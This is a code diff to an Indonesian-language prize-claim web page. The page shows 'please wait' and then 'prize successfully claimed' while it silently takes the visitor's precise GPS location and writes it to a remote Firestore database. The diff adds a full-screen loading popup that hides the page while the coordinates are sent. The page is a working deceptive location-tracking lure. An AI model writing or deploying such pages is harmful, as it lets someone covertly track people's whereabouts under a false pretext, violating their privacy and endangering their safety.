@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Klaim hadiah</title>
+  <title>klaim</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
@@ -14,11 +14,34 @@
       margin-top: 20px;
       color: green;
     }
+    #popupFoto {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    #popupFoto img {
+      max-width: 80%;
+      max-height: 80%;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #000;
+    }
   </style>
 </head>
 <body>
-  <h2>Loading ....</h2>
+  <h2></h2>
   <p class="status">Tunggu sebentar...</p>
+
+  <!-- Popup Foto -->
+  <div id="popupFoto">
+    <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Loading..." />
+  </div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
@@ -35,17 +58,25 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
+
     const statusEl = document.querySelector('.status');
+    const popup = document.getElementById('popupFoto');
+
+    const showPopup = () => popup.style.display = 'flex';
+    const hidePopup = () => popup.style.display = 'none';
 
     const updateLocation = (lat, lng) => {
+      showPopup(); // Tampilkan popup saat mulai mengirim
       const lokasiRef = doc(db, "lokasi_saya", "nasukafoods");
       setDoc(lokasiRef, {
         lat: lat,
         lng: lng,
         waktu: new Date().toISOString()
       }).then(() => {
+        hidePopup(); // Sembunyikan popup setelah selesai
         statusEl.textContent = "Hadiah berhasil di klaim.";
       }).catch(err => {
+        hidePopup();
         statusEl.textContent = "Error";
         console.error(err);
       });
@@ -57,6 +88,7 @@
         const lng = pos.coords.longitude;
         updateLocation(lat, lng);
       }, (err) => {
+        hidePopup();
         statusEl.textContent = "Error, Silahkan coba lagi";
       }, {
         enableHighAccuracy: true,
